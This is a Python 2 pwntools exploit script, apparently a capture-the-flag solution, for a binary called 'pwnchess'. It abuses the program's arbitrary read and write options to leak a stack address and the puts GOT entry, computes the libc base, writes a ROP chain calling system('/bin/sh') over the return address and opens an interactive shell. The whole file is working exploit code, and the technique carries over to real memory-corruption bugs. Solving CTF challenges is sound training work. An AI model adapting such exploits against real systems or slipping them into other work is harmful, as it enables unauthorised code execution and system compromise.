#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'

FNAME = '../distFiles/pwnchess'

DEBUG = False
REMOTE = False

ADDR_MOVES = 0x602060
GOT_PLT_PUTS = 0x602018

if REMOTE:
    raise Exception('add libc')
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def perf_exit(p):
    p.sendline('3')

def perf_write(p, addr, value):
    p.sendline('2')
    p.recvuntil(': ')
    p.sendline(str(addr))
    p.recvuntil(': ')
    p.sendline(str(value))


def perf_read(p, addr):
    p.sendline('1')
    p.recvuntil(': ')
    p.sendline(str(addr))
    p.recvuntil(' : ')
    ret = p.recvline().strip()
    return eval('0x%s' % ret)

def getp():
    if REMOTE:
        p = remote(HOST, PORT)
    elif DEBUG:
        p = process(['linux_serverx64', '-p4200', FNAME])
    else:
        p = process([FNAME])
    return p

p = getp()

# Calculate the stack address for RIP control
p.recvuntil('get you started: ')
leak_str = p.recvline().strip()
leak_addr = eval(leak_str)
log.info("Leaked stack address: 0x%x" % leak_addr)

return_address = leak_addr - 12
log.info("Return address to overwrite @ 0x%x" % return_address)

# Clear stdout buffer
p.recvuntil('moves: ')
p.recvline()

# Set maximum moves
perf_write(p, ADDR_MOVES, 0xff)
ret = perf_read(p, ADDR_MOVES)
assert(ret == 0xfe)

# leak puts address
puts_leak = 0
for i in range(8):
    puts_leak += perf_read(p, GOT_PLT_PUTS+i) << (8*i)
log.info('Leaked puts address: 0x%x' % puts_leak)

# Calculate base address
libc.address = puts_leak - libc.symbols['puts']
log.info('Libc base address: 0x%x' % libc.address)

# Build the ropchain
rop = ROP(libc)
binsh_addr = next(libc.search('/bin/sh\x00'))
rop.puts(binsh_addr)
rop.system(binsh_addr)
rop.exit(42)

print(rop.dump())
ropchain = str(rop)


# Write the ropchain onto the stack
for i in range(len(ropchain)):
    c = ord(ropchain[i])
    perf_write(p, return_address+i, c)

# set moves to zero
perf_write(p, ADDR_MOVES, 0x0)

p.interactive()
